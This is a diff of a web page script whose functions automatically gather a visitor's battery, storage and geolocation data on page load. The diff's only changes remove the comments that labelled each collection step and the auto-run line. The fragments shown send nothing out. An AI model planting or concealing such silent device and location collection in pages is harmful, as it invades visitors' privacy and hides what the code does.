@@ -40,7 +40,6 @@ async function gatherClientData() {
     } : {}
   };
 
-  // Battery info
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -55,7 +54,6 @@ async function gatherClientData() {
     }
   }
 
-  // Storage info
   if (navigator.storage && navigator.storage.estimate) {
     try {
       const est = await navigator.storage.estimate();
@@ -68,7 +66,6 @@ async function gatherClientData() {
     }
   }
 
-  // Geolocation
   if (navigator.geolocation) {
     try {
       const pos = await new Promise((resolve, reject) =>
@@ -104,7 +101,6 @@ async function autoCollect() {
   }
 }
 
-// Run automatically when the page loads
 window.onload = autoCollect;
 </script>
 </body>
